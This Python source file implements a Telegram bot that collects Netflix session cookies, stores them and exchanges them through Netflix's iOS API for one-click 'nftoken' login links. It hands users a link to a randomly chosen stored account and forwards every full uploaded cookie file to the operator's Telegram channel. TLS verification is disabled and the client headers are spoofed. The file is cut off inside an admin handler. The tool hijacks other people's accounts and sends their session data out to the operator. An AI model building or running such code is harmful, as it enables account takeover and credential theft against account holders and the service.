import os
import json
import re
import random
import urllib.parse
from datetime import datetime
import telebot
import requests
import time
import logging
from telebot import apihelper
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
from threading import Thread

# ============================================
# LOGGING CONFIG
# ============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# DISABLE SSL WARNINGS
# ============================================
import warnings
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

# ============================================
# FLASK APP (For Webhook + IP Grabber)
# ============================================
flask_app = Flask(__name__)

# ============================================
# BOT CONFIG
# ============================================
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not BOT_TOKEN:
    print("❌ TELEGRAM_TOKEN not found!")
    exit(1)

CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1003937881669")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8741623856"))
WATERMARK = "github.com/harshitkamboj"

# IP Grabber Config
GEOIP_API = "http://ip-api.com/json/"

COOKIE_FILE = "cookies.json"
USERS_FILE = "users.json"
CAPTURED_FILE = "captured.txt"

apihelper.READ_TIMEOUT = 120
apihelper.CONNECT_TIMEOUT = 120

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================
# BOT START TIME (For /uptime)
# ============================================
START_TIME = time.time()

# ============================================
# JSON FUNCTIONS
# ============================================
def load_json(file_name, default={}):
    if os.path.exists(file_name):
        try:
            with open(file_name, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(file_name, data):
    with open(file_name, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

def log_message(msg):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {msg}")

def load_cookies():
    return load_json(COOKIE_FILE)

def save_cookies(cookies):
    save_json(COOKIE_FILE, cookies)

def add_user(user_id, username):
    users = load_json(USERS_FILE)
    if str(user_id) not in users:
        users[str(user_id)] = {
            "username": username,
            "first_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "tokens_generated": 0
        }
        save_json(USERS_FILE, users)
    else:
        users[str(user_id)]["last_active"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        users[str(user_id)]["tokens_generated"] = users[str(user_id)].get("tokens_generated", 0) + 1
        save_json(USERS_FILE, users)

# ============================================
# SHAYARI LIST
# ============================================
SHAYARI_LIST = [
    "💫 Har mod pe milenge naye bahane,\nZindagi ke safar mein hain afsane,\nHum to chalte rahenge apni raah par,\nTum bhi muskurakar dikhao zamane.",
    "🌙 Chand ki chandni jaise khilti hai,\nHar sham nai ummid le kar aati hai,\nHumne to har din ek kahani likhi,\nTum apni kismat khud banati hai.",
    "💖 Dilon ke milne ki dastaan hai,\nHar pal mein teri pehchan hai,\nJo sachcha ho use manzil milti hai,\nBas ek nazar mohabbat ka farman hai.",
    "✨ Raatein bhi hain aur sitare bhi,\nTeri yaadon ke sahare bhi,\nHum to bas ek sapna dekhte hain,\nJismein ho teri baatein har baar bhi.",
    "🌺 Jo samandar se gehra hai,\nHar ada mein jadoo bhara hai,\nMohabbat ka har rang naya hai,\nHar ek sham tumhari kahani hai."
]

# ============================================
# NETFLIX API
# ============================================
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# ============================================
# COOKIE PARSING FUNCTIONS
# ============================================

def parse_netscape_cookie_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return {}
    
    if "\t" in line:
        parts = line.split("\t")
    else:
        parts = re.split(r'\s+', line)
    
    if len(parts) >= 7:
        return {parts[-2]: parts[-1]}
    return {}

def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("="):
            continue
        if ".netflix.com" in line:
            cookie_dict.update(parse_netscape_cookie_line(line))
    
    try:
        data = json.loads(text)
        if isinstance(data, dict):
            for key in COOKIE_KEYS:
                if key in data:
                    cookie_dict[key] = _decode_cookie_value(data[key])
    except:
        pass
    
    for key in COOKIE_KEYS:
        if key not in cookie_dict:
            match = re.search(rf"{re.escape(key)}=([^;,\s]+)", text)
            if match:
                cookie_dict[key] = _decode_cookie_value(match.group(1))
    
    return cookie_dict

def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL,
        params=QUERY_PARAMS,
        headers=headers,
        timeout=30,
        verify=False,
    )
    response.raise_for_status()

    data = response.json()
    token_data = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token found")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires

def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
    except:
        return str(expires)

def split_long_message(text, max_length=4000):
    if len(text) <= max_length:
        return [text]
    
    parts = []
    current_part = ""
    
    for line in text.split('\n'):
        if len(current_part) + len(line) + 1 > max_length:
            parts.append(current_part)
            current_part = line + '\n'
        else:
            current_part += line + '\n'
    
    if current_part:
        parts.append(current_part)
    
    return parts

def send_long_message(chat_id, text, parse_mode='HTML', reply_markup=None):
    parts = split_long_message(text)
    for i, part in enumerate(parts):
        try:
            if i == len(parts) - 1:
                bot.send_message(chat_id, part, parse_mode=parse_mode, reply_markup=reply_markup)
            else:
                bot.send_message(chat_id, part, parse_mode=parse_mode)
            time.sleep(0.3)
        except Exception as e:
            log_message(f"❌ Send error: {e}")
            bot.send_message(chat_id, part[:3500])

def save_to_channel(cookie_text, nftoken_link, expires, user_id, username, account_name="Unknown"):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if len(cookie_text) > 3000:
        cookie_text = cookie_text[:3000] + "\n\n... (Cookie truncated, too long)"
    
    message = "📥 NEW NFToken Generated!\n\n"
    message += "👤 User: " + username + " (ID: " + str(user_id) + ")\n"
    message += "📂 Account: " + account_name + "\n"
    message += "⏰ Time: " + current_time + "\n\n"
    message += "🔗 NFToken Link:\n"
    message += "`" + nftoken_link + "`\n\n"
    message += "⏳ Expires: `" + expires + "`\n\n"
    message += "🍪 Complete Cookie:\n"
    message += "```\n" + cookie_text + "\n```\n\n"
    message += "---\n"
    message += "🔹 Generated by: @NetflixNFTBot\n"
    message += "🔹 " + WATERMARK
    
    try:
        send_long_message(CHANNEL_ID, message, parse_mode='Markdown')
        return True, "Sent"
    except Exception as e:
        log_message(f"❌ Channel save error: {e}")
        return False, str(e)

def get_random_account():
    cookies = load_cookies()
    if not cookies:
        return None, "No accounts found! Please upload a cookie file."
    
    account_names = list(cookies.keys())
    random_account = random.choice(account_names)
    return random_account, None

def generate_random_token():
    account_name, error = get_random_account()
    if error:
        return None, error
    
    cookies = load_cookies()
    account = cookies.get(account_name, {})
    
    if not account:
        return None, f"Account '{account_name}' not found!"
    
    cookie_dict = {
        "NetflixId": account.get("NetflixId", "").strip(),
        "SecureNetflixId": account.get("SecureNetflixId", "").strip(),
        "nfvdid": account.get("nfvdid", "").strip()
    }
    
    if not cookie_dict["NetflixId"]:
        return None, f"❌ Account '{account_name}' has no NetflixId!"
    
    cookie_string = f"NetflixId={cookie_dict['NetflixId']}"
    if cookie_dict.get("SecureNetflixId"):
        cookie_string += f"; SecureNetflixId={cookie_dict['SecureNetflixId']}"
    if cookie_dict.get("nfvdid"):
        cookie_string += f"; nfvdid={cookie_dict['nfvdid']}"
    
    try:
        token, expires = fetch_nftoken(cookie_dict)
        nftoken_link = build_nftoken_link(token)
        expiry_str = format_expiry(expires)
        return {
            "token": token,
            "link": nftoken_link,
            "expires": expiry_str,
            "cookie_string": cookie_string,
            "account_name": account_name
        }, None
    except Exception as e:
        invalid_cookies = load_cookies()
        if account_name in invalid_cookies:
            del invalid_cookies[account_name]
            save_cookies(invalid_cookies)
            log_message(f"🗑️ Removed invalid cookie: {account_name}")
        return None, f"❌ Cookie '{account_name}' is invalid/expired! Removed from database."

def validate_cookie(cookie_dict):
    try:
        token, expires = fetch_nftoken(cookie_dict)
        if token:
            return True, token, expires
        return False, None, None
    except Exception as e:
        return False, None, None

# ============================================
# ADMIN CHECK DECORATOR
# ============================================
def admin_only(func):
    def wrapper(message):
        if message.from_user.id != ADMIN_ID:
            bot.reply_to(message, "❌ Only Admin can use this command!")
            return
        return func(message)
    return wrapper

# ============================================
# TELEGRAM COMMANDS - NETFLIX
# ============================================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or "Unknown"
    add_user(user_id, username)
    log_message(f"👤 New user: {username} ({user_id})")
    
    random_shayari = random.choice(SHAYARI_LIST)
    
    text = "😵 <b>NETFLIX NF TOKEN</b> 😵\n\n"
    text += "👑 <b>Owner:</b> ❤️ 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈 ❤️\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += "📌 <b>Commands:</b>\n"
    text += "   🍪 /netflix - Random NFToken\n"
    text += "   📄 Send .txt file - Upload Cookie\n"
    text += "   📋 Send Cookie - Manual\n"
    text += "   🆔 /myid - Your Telegram ID\n"
    text += "   📊 /cookies - Total cookies\n"
    text += "   🏓 /ping - Check response\n"
    text += "   📖 /help - Full command list\n"
    text += "   ⏱️ /uptime - Bot running time\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += "✨ <b>Aaj ki Shayari:</b> ✨\n\n"
    text += random_shayari + "\n\n"
    text += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    text += "📱 <b>Contact:</b> @PawanSaini\n"
    text += "⚡ <b>Made with ❤️ by:</b> 𝐏𝐀𝐖𝐀𝐍 𝐒𝐀𝐈𝐍𝐈"
    
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['netflix'])
def show_netflix_button(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name or "Unknown"
    add_user(user_id, username)
    
    cookies = load_cookies()
    if not cookies:
        bot.reply_to(message, "📭 No accounts found!\n\nUpload a .txt file to add accounts.", parse_mode='HTML')
        return
    
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="🌟 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 🌟",
        callback_data="netflix_random"
    )
    markup.add(button)
    
    text = "🎬 <b>Click below to get a random NFToken:</b>\n\n"
    text += f"📂 <b>Total Accounts:</b> {len(cookies)}\n\n"
    text += "✨ हर बार मिलेगा एक नया Token!"
    
    bot.reply_to(message, text, parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "netflix_random":
        bot.edit_message_text(
            "🎲 <b>Random Account Selected!</b>\n\n⏳ Generating NFToken...",
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML'
        )
        
        result, error = generate_random_token()
        
        if error:
            bot.edit_message_text(
                f"❌ <b>Error:</b> {error}",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='HTML'
            )
            bot.answer_callback_query(call.id, "Error!")
            return
        
        success_text = "✅ <b>NFToken Generated!</b> 🎉\n\n"
        success_text += f"📂 <b>Account:</b> {result['account_name']}\n"
        success_text += f"🔗 <b>Link:</b>\n<code>{result['link']}</code>\n\n"
        success_text += f"⏰ <b>Expires:</b> <code>{result['expires']}</code>\n\n"
        success_text += "📢 <b>Saved in Channel!</b>\n\n"
        success_text += "🔄 Click again for a new random token!"
        
        bot.edit_message_text(
            success_text,
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            parse_mode='HTML'
        )
        
        user_id = call.from_user.id
        username = call.from_user.username or call.from_user.first_name or "Unknown"
        add_user(user_id, username)
        
        save_to_channel(
            result['cookie_string'],
            result['link'],
            result['expires'],
            user_id,
            username,
            result['account_name']
        )
        bot.answer_callback_query(call.id, f"✅ Token from {result['account_name']}!")
    
    elif call.data == "cancel":
        bot.edit_message_text("❌ Cancelled!", chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.answer_callback_query(call.id, "Cancelled")

# ============================================
# 📄 FILE UPLOAD
# ============================================
@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        msg = bot.reply_to(message, "📄 File Received! Processing...")
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8', errors='ignore')
        
        file_name = message.document.file_name
        cookie_dict = extract_cookie_dict(content)
        
        if not cookie_dict or not cookie_dict.get("NetflixId"):
            bot.edit_message_text(
                "❌ No valid Netflix cookies found in file!\n\n"
                "💡 Make sure file contains:\n"
                "• NetflixId\n"
                "• SecureNetflixId\n"
                "• nfvdid",
                chat_id=message.chat.id,
                message_id=msg.message_id
            )
            return
        
        is_valid, token, expires = validate_cookie(cookie_dict)
        
        if not is_valid:
            bot.edit_message_text(
                "❌ <b>Invalid Cookie!</b>\n\n"
                "This cookie is expired or invalid.\n\n"
                "💡 Please upload a valid cookie file.",
                chat_id=message.chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
            return
        
        account_name = file_name.replace('.txt', '').replace('.cookie', '').replace('.netscape', '')
        if not account_name:
            account_name = f"File_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        cookies = load_cookies()
        
        if account_name in cookies:
            account_name = f"{account_name}_{datetime.now().strftime('%H%M%S')}"
        
        cookies[account_name] = {
            "NetflixId": cookie_dict.get("NetflixId", ""),
            "SecureNetflixId": cookie_dict.get("SecureNetflixId", ""),
            "nfvdid": cookie_dict.get("nfvdid", "")
        }
        save_cookies(cookies)
        
        nftoken_link = build_nftoken_link(token)
        expiry_str = format_expiry(expires)
        
        success = "✅ <b>NFToken Ready!</b>\n\n"
        success += f"📄 <b>File:</b> {file_name}\n"
        success += f"📂 <b>Account:</b> {account_name}\n"
        success += f"🔗 <b>Link:</b>\n<code>{nftoken_link}</code>\n\n"
        success += f"⏰ <b>Expires:</b> <code>{expiry_str}</code>\n\n"
        success += "💾 <b>Permanently Saved!</b>\n"
        success += f"📌 <b>Total Accounts:</b> {len(cookies)}\n\n"
        success += "📢 <b>Saved in Channel!</b>"
        
        bot.edit_message_text(success, chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
        
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or "Unknown"
        add_user(user_id, username)
        
        save_to_channel(content, nftoken_link, expiry_str, user_id, username, account_name)
        log_message(f"📄 File uploaded: {file_name} by {username}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
        log_message(f"❌ File upload error: {e}")

# ============================================
# 🆕 NEW COMMANDS
# ============================================

@bot.message_handler(commands=['cookies'])
def total_cookies(message):
    cookies = load_cookies()
    bot.reply_to(message, f"📂 Total Cookies: {len(cookies)}")

@bot.message_handler(commands=['myid'])
def get_user_id(message):
    bot.reply_to(message, f"🆔 Your ID: `{message.from_user.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['ping'])
def ping(message):
    start = time.time()
    bot.reply_to(message, "🏓 Pong!")
    time.sleep(0.5)
    end = time.time()
    bot.edit_message_text(f"🏓 Pong!\n⏱️ {round((end-start)*1000)}ms", message.chat.id, message.message_id+1)

@bot.message_handler(commands=['help'])
def help_command(message):
    text = "📖 <b>Commands List:</b>\n\n"
    text += "✅ <b>Public Commands:</b>\n"
    text += "/start - Welcome with shayari\n"
    text += "/netflix - Generate NFToken\n"
    text += "/cookies - Total cookie count\n"
    text += "/myid - Your Telegram ID\n"
    text += "/ping - Check bot response\n"
    text += "/help - This message\n"
    text += "/uptime - Bot running time\n\n"
    text += "👑 <b>Admin Commands:</b>\n"
    text += "/addcookie - Add cookie\n"
    text += "/listcookies - List all cookies\n"
    text += "/removecookie - Remove cookie\n"
    text += "/stats - Bot statistics\n"
    text += "/users - All users list\n"
    text += "/broadcast - Send to all users\n"
    text += "/cleancookies - Remove invalid\n"
    text += "/restart - Restart bot\n"
    text += "/export - Export all cookies\n"
    text += "/deleteuser - Remove user\n"
    text += "/cookies_json - Raw cookies\n"
    text += "/autoadd - Bulk add cookies"
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['uptime'])
def uptime(message):
    uptime_sec = int(time.time() - START_TIME)
    days = uptime_sec // 86400
    hours = (uptime_sec % 86400) // 3600
    mins = (uptime_sec % 3600) // 60
    secs = uptime_sec % 60
    bot.reply_to(message, f"⏱️ Uptime: {days}d {hours}h {mins}m {secs}s")

# ============================================
# 👑 ADMIN COMMANDS
# ============================================

@bot.message_handler(commands=['addcookie'])
def add_cookie_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this command!")
        return
    
    text = "📝 <b>Cookie Add karne ke liye format:</b>\n\n"
    text += "<code>/addcookie</code>\n"
    text += "<code>Account_Name</code>\n"
    text += "<code>NetflixId: value</code>\n"
    text += "<code>SecureNetflixId: value</code>\n"
    text += "<code>nfvdid: value</code>\n\n"
    text += "<b>Example:</b>\n"
    text += "<code>/addcookie</code>\n"
    text += "<code>Premium 1</code>\n"
    text += "<code>NetflixId: ct%3DBgjHlOvc...</code>\n"
    text += "<code>SecureNetflixId: v%3D3%26mac%3D...</code>\n"
    text += "<code>nfvdid: BQFmAAEBEL2s...</code>"
    
    bot.reply_to(message, text, parse_mode='HTML')
    bot.register_next_step_handler(message, process_add_cookie)

def process_add_cookie(message):
    try:
        lines = message.text.strip().split('\n')
        
        if len(lines) < 4:
            bot.reply_to(message, "❌ Invalid format! Use /addcookie to see correct format.")
            return
        
        account_name = lines[0].strip()
        netflix_id = None
        secure_netflix_id = None
        nfvdid = None
        
        for line in lines[1:]:
            line = line.strip()
            if line.lower().startswith('netflixid:'):
                netflix_id = line.split(':', 1)[1].strip()
            elif line.lower().startswith('securenetflixid:'):
                secure_netflix_id = line.split(':', 1)[1].strip()
            elif line.lower().startswith('nfvdid:'):
                nfvdid = line.split(':', 1)[1].strip()
        
        if not all([account_name, netflix_id, secure_netflix_id, nfvdid]):
            bot.reply_to(message, "❌ Missing values! Need: Account Name, NetflixId, SecureNetflixId, nfvdid")
            return
        
        cookie_dict = {
            "NetflixId": netflix_id,
            "SecureNetflixId": secure_netflix_id,
            "nfvdid": nfvdid
        }
        
        is_valid, token, expires = validate_cookie(cookie_dict)
        
        if not is_valid:
            bot.reply_to(message, "❌ <b>Invalid Cookie!</b>\n\nThis cookie is expired or invalid.", parse_mode='HTML')
            return
        
        cookies = load_cookies()
        cookies[account_name] = cookie_dict
        save_cookies(cookies)
        
        log_message(f"✅ Admin added cookie: {account_name}")
        bot.reply_to(message, f"✅ <b>Cookie Added Successfully!</b>\n\n📂 Account: {account_name}\n📌 Total Accounts: {len(cookies)}", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['listcookies'])
def list_cookies(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this command!")
        return
    
    cookies = load_cookies()
    if not cookies:
        bot.reply_to(message, "📭 No cookies found!")
        return
    
    text = "📂 <b>Saved Cookies:</b>\n\n"
    for i, (name, data) in enumerate(cookies.items(), 1):
        text += f"{i}. <b>{name}</b>\n"
        text += f"   • NetflixId: <code>{data.get('NetflixId', '')[:30]}...</code>\n"
        text += f"   • SecureNetflixId: <code>{data.get('SecureNetflixId', '')[:30]}...</code>\n"
        text += f"   • nfvdid: <code>{data.get('nfvdid', '')[:30]}...</code>\n\n"
    
    text += f"📌 <b>Total:</b> {len(cookies)} accounts"
    
    send_long_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['removecookie'])
def remove_cookie(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this command!")
        return
    
    cookies = load_cookies()
    if not cookies:
        bot.reply_to(message, "📭 No cookies found!")
        return
    
    text = "🗑️ <b>Remove Cookie:</b>\n\nSend the exact account name to delete:\n\n"
    for name in cookies.keys():
        text += f"• <code>{name}</code>\n"
    
    bot.reply_to(message, text, parse_mode='HTML')
    bot.register_next_step_handler(message, process_remove_cookie)

def process_remove_cookie(message):
    account_name = message.text.strip()
    cookies = load_cookies()
    
    if account_name not in cookies:
        bot.reply_to(message, f"❌ Account <code>{account_name}</code> not found!", parse_mode='HTML')
        return
    
    del cookies[account_name]
    save_cookies(cookies)
    
    log_message(f"🗑️ Admin removed cookie: {account_name}")
    bot.reply_to(message, f"✅ Account <code>{account_name}</code> deleted successfully!", parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def show_stats(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this command!")
        return
    
    cookies = load_cookies()
    users = load_json(USERS_FILE)
    
    text = "📊 <b>Bot Statistics:</b>\n\n"
    text += f"📂 <b>Total Accounts:</b> {len(cookies)}\n"
    text += f"👤 <b>Total Users:</b> {len(users)}\n"
    text += f"📢 <b>Channel ID:</b> {CHANNEL_ID}\n"
    text += f"🤖 <b>Bot Status:</b> Active ✅\n"
    text += f"⏰ <b>Uptime:</b> {int(time.time() - START_TIME)//3600}h\n\n"
    text += "📌 <b>Commands:</b>\n"
    text += "   /netflix - Random Token\n"
    text += "   /addcookie - Add Cookie\n"
    text += "   /listcookies - List All\n"
    text += "   /removecookie - Remove Cookie\n"
    text += "   /stats - This Message\n"
    text += "   /broadcast - Broadcast Message\n"
    text += "   /users - List All Users"
    
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this command!")
        return
    
    users = load_json(USERS_FILE)
    if not users:
        bot.reply_to(message, "👤 No users found!")
        return
    
    text = "👤 <b>Users List:</b>\n\n"
    for i, (user_id, data) in enumerate(users.items(), 1):
        text += f"{i}. <b>{data.get('username', 'Unknown')}</b>\n"
        text += f"   • ID: <code>{user_id}</code>\n"
        text += f"   • First Seen: {data.get('first_seen', 'Unknown')}\n"
        text += f"   • Tokens: {data.get('tokens_generated', 0)}\n\n"
    
    text += f"📌 <b>Total Users:</b> {len(users)}"
    
    send_long_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this command!")
        return
    
    bot.reply_to(message, "📝 <b>Send the message you want to broadcast:</b>\n\n(Reply with the message)", parse_mode='HTML')
    bot.register_next_step_handler(message, process_broadcast)

def process_broadcast(message):
    broadcast_text = message.text
    users = load_json(USERS_FILE)
    
    if not users:
        bot.reply_to(message, "❌ No users found to broadcast!")
        return
    
    success_count = 0
    fail_count = 0
    
    status_msg = bot.reply_to(message, f"⏳ Broadcasting to {len(users)} users...")
    
    for user_id in users.keys():
        try:
            bot.send_message(
                int(user_id),
                f"📢 <b>Broadcast Message:</b>\n\n{broadcast_text}\n\n---\n🔹 Powered by Netflix NFT Bot",
                parse_mode='HTML'
            )
            success_count += 1
            time.sleep(0.2)
        except:
            fail_count += 1
    
    log_message(f"📢 Broadcast sent to {success_count} users, failed: {fail_count}")
    
    bot.edit_message_text(
        f"✅ <b>Broadcast Complete!</b>\n\n"
        f"📨 <b>Sent:</b> {success_count} users\n"
        f"❌ <b>Failed:</b> {fail_count} users\n"
        f"📩 <b>Message:</b>\n{broadcast_text}",
        chat_id=message.chat.id,
        message_id=status_msg.message_id,
        parse_mode='HTML'
    )

@bot.message_handler(commands=['cleancookies'])
def clean_cookies(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this command!")
        return
    
    status_msg = bot.reply_to(message, "⏳ Cleaning invalid cookies...")
    cookies = load_cookies()
    invalid = []
    valid_count = 0
    
    for account_name, account_data in cookies.items():
        cookie_dict = {
            "NetflixId": account_data.get("NetflixId", ""),
            "SecureNetflixId": account_data.get("SecureNetflixId", ""),
            "nfvdid": account_data.get("nfvdid", "")
        }
        is_valid, _, _ = validate_cookie(cookie_dict)
        if not is_valid:
            invalid.append(account_name)
        else:
            valid_count += 1
    
    if invalid:
        for name in invalid:
            if name in cookies:
                del cookies[name]
        save_cookies(cookies)
        
        invalid_list = "\n".join(invalid[:20])
        if len(invalid) > 20:
            invalid_list += f"\n... and {len(invalid)-20} more"
        
        bot.edit_message_text(
            f"🗑️ <b>Cleaned {len(invalid)} invalid cookies!</b>\n\n"
            f"✅ <b>Valid Cookies:</b> {valid_count}\n"
            f"❌ <b>Invalid Cookies:</b> {len(invalid)}\n\n"
            f"<b>Removed:</b>\n{invalid_list}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
    else:
        bot.edit_message_text(
            f"✅ <b>All cookies are valid!</b>\n\n"
            f"📂 <b>Total Accounts:</b> {len(cookies)}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )

# ============================================
# 🆕 NEW ADMIN COMMANDS
# ============================================

@bot.message_handler(commands=['restart'])
@admin_only
def restart_bot(message):
    bot.reply_to(message, "🔄 Restarting... (Bot will reconnect automatically)")

@bot.message_handler(commands=['export'])
@admin_only
def export_cookies(message):
    cookies = load_cookies()
    if not cookies:
        bot.reply_to(message, "📭 No cookies to export!")
        return
    import io
    file_data = json.dumps(cookies, indent=4, ensure_ascii=False)
    file = io.StringIO(file_data)
    bot.send_document(message.chat.id, ("cookies_backup.json", file.getvalue()))

@bot.message_handler(commands=['deleteuser'])
@admin_only
def delete_user(message):
